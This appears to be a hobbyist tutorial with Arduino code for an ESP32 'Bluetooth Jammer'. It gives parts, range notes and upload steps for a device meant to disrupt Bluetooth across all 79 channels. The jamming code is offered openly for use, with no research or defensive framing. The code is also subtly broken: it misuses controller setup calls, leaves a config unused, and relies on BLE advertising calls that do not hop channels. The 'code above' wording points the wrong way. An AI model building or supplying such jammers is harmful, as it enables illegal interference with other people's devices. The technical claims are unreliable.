# Component Requirements:
  ESP32 Development Board
  USB cable for programming and power

# Important Notes:

--This device works by sending fake Bluetooth packets across all 79 Bluetooth channels, causing interference
--The range of this jammer is limited (typically 10-20 meters depending on the ESP32 model)
--For better results, you can add an external antenna to your ESP32 if it supports one
--You can adjust the delayTime variable to change the frequency of packets (lower values = more interference but more processing load)

# Instructions for Use:

  1. Install the ESP32 board support in Arduino IDE if you haven't already
  2. Connect your ESP32 to your computer via USB
  3. Open the Arduino IDE and select the correct ESP32 board
  4. Copy and paste the code above into a new sketch
  5. Upload the sketch to your ESP32
  6. Open the Serial Monitor (set to 115200 baud rate)
  7. Send 'j' to start jamming and 's' to stop

# code

#include "BluetoothSerial.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_wifi.h"

#if !defined(CONFIG_BT_ENABLED) || !defined(CONFIG_BLUEDROID_ENABLED)
#error Bluetooth is not enabled! Please run `make menuconfig` to and enable it
#endif

BluetoothSerial SerialBT;

// Variables for jamming
bool isJamming = false;
int channel = 0;
int delayTime = 1; // milliseconds between packets

void setup() {
  Serial.begin(115200);
  
  // Initialize Bluetooth
  SerialBT.begin("BT Jammer"); // Bluetooth device name
  Serial.println("Bluetooth Jammer Initialized");
  
  // Initialize Wi-Fi (needed for some BT functions)
  WiFi.mode(WIFI_MODE_NULL);
  
  // Set up LED pin if used
  pinMode(2, OUTPUT);
  digitalWrite(2, LOW);
  
  Serial.println("Ready to jam Bluetooth signals");
  Serial.println("Send 'j' to start jamming, 's' to stop");
}

void loop() {
  // Check for serial commands
  if (Serial.available()) {
    char command = Serial.read();
    
    if (command == 'j') {
      startJamming();
    } else if (command == 's') {
      stopJamming();
    }
  }
  
  // If jamming is active, send interference packets
  if (isJamming) {
    jamBluetooth();
  }
}

void startJamming() {
  if (!isJamming) {
    isJamming = true;
    Serial.println("Jamming started");
    digitalWrite(2, HIGH); // Turn on LED
    
    // Start Bluetooth in a mode that allows packet injection
    esp_bt_controller_mem_release(ESP_BT_MODE_BTDM);
    esp_bt_controller_enable(ESP_BT_MODE_BTDM);
  }
}

void stopJamming() {
  if (isJamming) {
    isJamming = false;
    Serial.println("Jamming stopped");
    digitalWrite(2, LOW); // Turn off LED
    
    // Disable Bluetooth controller
    esp_bt_controller_disable();
  }
}

void jamBluetooth() {
  // Cycle through all Bluetooth channels
  for (channel = 0; channel < 79; channel++) {
    // Send interference packets on current channel
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    
    // Create fake Bluetooth packets to interfere with communication
    uint8_t fake_packet[14] = {
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Fake BD_ADDR
      0x00, 0x00,                         // Fake flags
      0x00,                               // Fake length
      0x00, 0x00, 0x00, 0x00, 0x00        // Random data
    };
    
    // Send the packet
    esp_ble_gap_config_adv_data_raw(fake_packet, sizeof(fake_packet));
    
    // Small delay to prevent overwhelming the system
    delay(delayTime);
  }
}